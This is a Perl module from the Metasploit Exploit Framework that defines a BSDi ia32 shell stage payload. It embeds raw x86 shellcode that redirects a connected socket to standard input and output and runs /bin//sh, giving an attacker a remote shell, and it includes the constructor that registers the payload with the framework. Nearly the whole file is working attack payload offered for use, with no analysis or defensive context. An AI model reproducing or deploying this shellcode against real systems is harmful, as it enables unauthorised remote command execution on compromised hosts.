###############
##
#
#    Name: ShellStage.pm
# Version: $Revision$
#  Source: src/shellcode/bsdi/ia32/stage_tcp_shell.asm
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      setreuid
#      dup2
#      execve
#
##
###############

package Msf::PayloadComponent::BSDi::ia32::ShellStage;

use strict;
use base 'Msf::PayloadComponent::BSDi::StagePayload';

my $info =
{
	Authors           => [ 'skape <mmiller [at] hick.org>', ],
	Priv              => 0,
	StagePayload      => 
		{
			Payload =>
				"\x68\x00\x07\x00\xc3\xb8\x9a\x00\x00\x00\x99\x50\x89\xe6\x31\xc0" .
				"\x50\x50\xb0\x7e\xff\xd6\x6a\x02\x59\x6a\x5a\x58\x51\x57\xff\xd6" .
				"\x49\x79\xf6\x6a\x3b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62" .
				"\x69\x6e\x89\xe3\x52\x54\x53\xff\xd6"
		},
};

sub new
{
	my $class = shift;
	my $hash = @_ ? shift : { };
	my $self;

	$hash = $class->MergeHashRec($hash, {'Info' => $info});
	$self = $class->SUPER::new($hash);

	return $self;
}

1;
